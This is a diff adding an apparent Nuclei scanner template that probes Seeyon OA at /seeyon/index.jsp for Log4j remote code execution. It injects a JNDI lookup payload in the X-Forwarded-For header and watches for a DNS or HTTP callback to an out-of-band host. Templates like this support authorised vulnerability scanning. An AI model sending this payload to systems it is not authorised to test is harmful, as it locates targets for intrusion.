@@ -1,0 +1,36 @@
+id: seeyon-index-log4j
+
+info:
+  name: 致远 OA log4j - rce
+  author: Str1am
+  severity: critical
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: false
+    fofa-qeury:
+  tags: seeyon,log4j,rce,oa,oob
+
+http:
+  - raw:
+      - |
+        GET /seeyon/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
+        Connection: close
+        X-Forwarded-For: ${jndi:dns://seeyon.{{interactsh-url}}/test}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
